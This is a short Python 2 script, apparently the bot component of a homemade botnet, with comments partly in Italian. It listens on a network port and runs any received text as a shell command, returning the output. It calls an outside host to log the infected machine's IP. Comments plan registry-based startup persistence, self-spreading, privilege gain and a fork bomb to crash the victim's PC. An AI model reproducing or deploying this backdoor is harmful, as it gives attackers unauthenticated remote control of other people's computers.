#!/usr/bin/python           #  Server 
import os
import socket               
import subprocess
import urllib2,os,string


####################################################
# future features
#            menu 1) sys command execution
#                2) chat with bot (send command on its cmd
#            3) list of totals bots (python e java botnet) & communicate on sharedbotnet with java--> (comi)
#            4) drop connection
#             5) other funny things? search gain admin with cmd 
#            6) aaScan for vulnerabilities   (HANDLE PORT FORWARDING SO I CAN WORK ON WAN
#            7) extra things like self spreading,hosting honeypot get all traffic of the bot (http(s) ecc...) 
# startup reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "%temp%\server.exe" /f
# 8) fork bomb .. crash the client pc (start cmds,calcs,paint.. ecc..)
############################################
s = socket.socket()         # Create a socket object
host = socket.gethostname() # Get local machine name
port = 2346               # Reserve a port for your service.
s.bind((host, port))        # Bind to the port
#remoteip = urllib2.urlopen("http://myip.dnsdynamic.org/").read() #ip grabber 
s.listen(5)                # Connessioni massime
f =  urllib2.urlopen("http://samick.url.ph/")  #stores bot ip every time the bot get connected
#os.system("ping s4mick.dyndns.com") send ip to dyndns host that store it
#make site that stores all ips  (php ip logger)
while True:
   c, addr = s.accept()     # Establish connection with client ritorna un socket c con cui si puo fare send\recv e poi l'indirizzo del bot
   msg=c.recv(1024)+""
   os.system(msg)
   msgre=os.popen(msg).read()
   result=string.split(msgre)
   print msgre
   out='[%s]' % ', '.join(map(str, result))
   c.send(out+'\n Comando eseguito')
   print host+" :"+msg
               # Close the connection
s.close()
c.close()

